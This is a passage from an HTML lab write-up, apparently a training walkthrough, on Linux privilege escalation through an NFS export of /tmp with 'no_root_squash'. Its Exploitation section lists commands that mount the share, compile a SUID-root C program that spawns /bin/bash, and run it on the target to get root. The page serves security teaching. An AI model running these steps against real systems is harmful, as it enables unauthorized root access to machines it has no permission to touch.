								that<b>&nbsp;“no_root_squash”</b>&nbsp;option is defined for the
								<b>“/tmp”</b>&nbsp;export.</li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 42.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b>Exploitation</b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Attacker VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">Open command prompt and type: <i>showmount -e
									10.10.63.72</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 43.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>mkdir /tmp/1</i></li>
							<li style="list-style-type: none">In command prompt type: <i>mount -o rw,vers=2
									10.10.63.72:/tmp /tmp/1</i></li>
							<li style="list-style-type: none">In command prompt type: <i>echo 'int main() { setgid(0);
									setuid(0); system("/bin/bash"); return 0; }' &gt; /tmp/1/x.c</i></li>
							<li style="list-style-type: none">In command prompt type: <i>gcc /tmp/1/x.c -o /tmp/1/x</i>
							</li>
							<li style="list-style-type: none">In command prompt type: <i>chmod +s /tmp/1/x</i></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><b><img src="image 44.png" /></b></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none"><u>Linux VM</u></li>
							<li style="list-style-type: none"></li>
							<li style="list-style-type: none">In command prompt type: <i>/tmp/x</i></li>
							<li style="list-style-type: none">In command prompt type: <i>id</i><b></b></li>
							<b>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"><img src="image 45.png" /></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
								<li style="list-style-type: none"></li>
							</b>
						</span></ul>



				</div>

			</section>

		</div>

		<!-- Contact -->
		<section id="contact">
			<div class="inner">
			</div>
		</section>

		<!-- Footer -->
		<footer id="footer">
			<div class="inner">
			</div>
		</footer>

	</div>

	<!-- Scripts -->
	<script src="../../assets/js/jquery.min.js"></script>
	<script src="../../assets/js/jquery.scrolly.min.js"></script>
	<script src="../../assets/js/jquery.scrollex.min.js"></script>
	<script src="../../assets/js/browser.min.js"></script>
	<script src="../../assets/js/breakpoints.min.js"></script>
	<script src="../../assets/js/util.js"></script>
	<script src="../../assets/js/main.js"></script>

</body>

</html>